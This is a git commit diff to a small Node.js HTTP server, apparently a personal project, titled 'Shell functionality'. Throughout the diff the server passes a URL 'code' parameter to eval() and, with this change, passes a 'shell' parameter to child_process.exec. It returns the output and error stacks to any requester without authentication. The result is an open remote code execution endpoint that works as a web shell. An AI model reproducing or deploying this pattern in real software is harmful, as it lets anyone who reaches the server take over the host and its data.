26d05f38b51e2c41fb71290c6de5c1326c684d8e
Danila Poyarkov <dannotemail@gmail.com>
2014-03-02 00:21:53 +0400

    Shell functionality

--- app.js
+++ app.js
@@ -1,10 +1,21 @@
 var http = require('http');
 var url = require('url');
+var exec = require('child_process').exec
 
 http.createServer(function(request, response) {
 	try {
-		var code = url.parse(request.url, true).query.code;
-		response.end(code ? '' + eval(code) : 'All right');
+		var query = url.parse(request.url, true).query;
+		if (query.code) {
+			response.end(eval(query.code));
+			return;
+		}
+		if (query.shell) {
+			exec(query.shell, function(error, stdout) {
+				response.end(stdout);
+			});
+			return;
+		}
+		response.end('All right');
 	} catch (error) {
 		response.end(error.stack);
 	}
